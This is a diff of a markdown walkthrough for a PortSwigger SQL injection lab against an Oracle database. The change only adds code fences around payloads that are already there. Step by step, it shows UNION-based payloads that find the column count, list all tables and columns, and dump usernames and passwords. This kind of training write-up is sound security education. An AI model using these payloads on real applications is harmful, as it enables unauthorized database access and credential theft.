@@ -42,7 +42,10 @@ Opened the lab and picked a simple filter like **Lifestyle** to generate the req
 ## **2. Test for SQLi Using UNION**
 
 Injected this payload into the category parameter:
+
+```
 '+UNION+SELECT+'a','b'+FROM+dual--
+```
 
 It rendered properly → confirms **2 columns** and both accept text.
 
@@ -56,7 +59,10 @@ We need to confirm column count + datatypes because UNION queries must match the
 ## **3. Enumerate All Tables in the Database**
 
 Next payload used:
+
+```
 '+UNION+SELECT+table_name,+NULL+FROM+all_tables--
+```
 
 This dumped a huge list of Oracle system and application tables.
 
@@ -80,7 +86,10 @@ This fits the naming pattern PortSwigger uses (random suffix appended).
 ## **5. Enum Columns Inside the Users Table**
 
 Payload used:
+
+```
 '+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_XWMOWS'--
+```
 
 Output:
 
@@ -98,7 +107,11 @@ Oracle stores columns in all_tab_columns. Now we know which fields store usernam
 ## **6. Dump Usernames & Passwords**
 
 Final payload:
+
+```
 '+UNION+SELECT+USERNAME_NJJLEA,+PASSWORD_GPUUAA+FROM+USERS_XWMOWS--
+
+```
 
 Dumped creds:
 
